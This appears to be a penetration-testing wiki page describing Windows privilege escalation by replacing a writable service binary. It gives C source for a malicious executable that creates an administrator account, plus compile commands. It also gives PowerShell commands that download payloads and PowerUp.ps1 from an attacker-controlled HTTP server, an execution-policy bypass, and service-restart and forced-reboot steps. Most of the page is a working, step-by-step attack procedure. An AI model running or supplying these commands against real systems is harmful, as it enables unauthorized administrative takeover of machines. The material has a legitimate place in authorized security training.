---
description: >-
  This attack involves replacing the service binary with a malicious version and
  restart the service.
---

# Service Binary Hijacking

Enumerate Services

Using `Get-CimInstance` with PowerShell to list running services and filter built in services:

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running' -and $_.PathName -notlike "C:\Windows\system32*"}
```
{% endcode %}

{% hint style="warning" %}
When running **`Get-CimInstance`** and **`Get-Service`** via **WinRM** or a **bind shell** will result in a "Access denied" error when querying for services with a **non-administrative user**. \
Using an interactive logon such as **RDP** solves this problem.
{% endhint %}

## **Enumerate Binary Permissions**

Verifying the permission to modify the binary:

```batch
icacls "<binary_path>"
```

The table below describes the permissions definitions **`icacls`** results:

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

## Creating The Malicious Binary

The C code you provided appears to add a new user `<user>`  with the password `password123!` to the system and elevate it to administrator:

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user <user> password123! /add");
  i = system ("net localgroup administrators <user> /add");
  
  return 0;
}
```

Compiling this C code to create an executable:

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Moving the legitimate service's binary, in order to be able to replace with the malicious one:

```batch
move <binary_path> <somepath>
```

Transferring the executable from the attacker machine:

```powershell
iwr -uri http://<attacker_http_server>/adduser.exe -Outfile <binary_path>
```

## **Triggering the Execution**

In order to trigger the malicious binary execution it's needed to either restart the service manually or If the service is set to start automatically, it possible to reboot the machine to force the service to start.\
Once the service restarts, the malicious binary will be executed.

Checking the Service Permissions:

```batch
sc sdshow <service_name>
```

### Manual restart

Trying to restart the service:

{% tabs %}
{% tab title="Batch" %}
```batch
net stop <service_name>
net start <service_name>
```
{% endtab %}

{% tab title="PowerShell" %}
```powershell
Stop-Service <Service_name>
Start-Service <Service_name>
```
{% endtab %}
{% endtabs %}

### Automatic restart

If restarting the service is not allowed, trying the another method as described above:

1. Checking if the service set to restart automatically:

```batch
sc query <service_name>
```

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '<service_name>'}
```
{% endcode %}

2. Checking if the current user (foothold) has the **`SeShutdownPrivilege`** permission which allows to reboot the machine&#x20;

```batch
whoami /priv
```

3. Rebooting the machine&#x20;

`/r` - Reboot instead of shutdown.

`/t 0` - Trigger in 0 seconds.

```batch
shutdown /r /t 0
```

## Automated Process

It is possible to automate the process using well known tool called `PowerUp` from `PowerSploit` Collection:

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

Downloading PowerUp.ps1:

```powershell
iwr -uri http://<attacker_http_server>/PowerUp.ps1 -Outfile PowerUp.ps1
```

Bypassing Execution Policy:

```batch
powershell -ep bypass
```

Importing PowerUp.ps1:

```powershell
. .\PowerUp.ps1
```

Finding Modifiable Services using **`Get-ModifiableServiceFile`** is a `PowerUp` function that looks for services on the machine whose executables are modifiable by the current user.

```powershell
Get-ModifiableServiceFile
```

Exploiting:

```powershell
Install-ServiceBinary -Name '<service_name>'
```

## References

{% embed url="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query" %}
Sc.exe query
{% endembed %}
